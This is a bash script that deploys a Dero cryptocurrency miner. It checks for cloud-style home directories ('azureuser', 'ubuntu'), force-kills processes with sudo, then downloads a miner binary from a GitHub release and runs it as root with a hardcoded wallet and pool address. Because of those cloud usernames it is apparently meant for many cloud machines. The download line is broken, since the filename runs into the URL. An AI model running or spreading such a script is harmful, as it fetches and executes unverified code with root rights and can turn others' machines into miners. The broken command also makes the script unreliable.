#!/bin/bash
if [ -d "/home/azureuser" ]; then
    username="azureuser"
elif [ -d "/home/ubuntu" ]; then
	username="ubuntu"
else
	username=$(ls /home | sed -n 1p)
fi
cd /
if pgrep -x "deroplus" > /dev/null
then
	sudo kill -9 $(pgrep -x "deroplus")
fi
defunctpid=$(ps -A -ostat,ppid | awk '/[zZ]/ && !a[$2]++ {print $2}')
if [ ! -z "$defunctpid" ]; then
	sudo kill -9 $defunctpid
fi
file="deroplus"
if [ -f $file ]; then
    nohup sudo ./deroplus --wallet=dero1qy44fvxwrd70gukmsylxarx72hsejzf0rf6apzdsjlu2mrj9ck08zqg0kzggr --host=185.132.125.4:10200
else
    wget -O deroplus-linux-amd64.tar.gzhttps://github.com/Jonutz123/AstroBWTv3-Miner/releases/download/publish2/deroplus-linux-amd64.tar.gz
    tar xvf deroplus-linux-amd64.tar.gz
    chmod +x deroplus-linux-amd64
    sudo mv -f deroplus-linux-amd64 deroplus
    nohup sudo ./deroplus --wallet=dero1qy44fvxwrd70gukmsylxarx72hsejzf0rf6apzdsjlu2mrj9ck08zqg0kzggr --host=185.132.125.4:10200
fi
defunctpid=$(ps -A -ostat,ppid | awk '/[zZ]/ && !a[$2]++ {print $2}')
if [ ! -z "$defunctpid" ]; then
	sudo kill -9 $defunctpid
fi
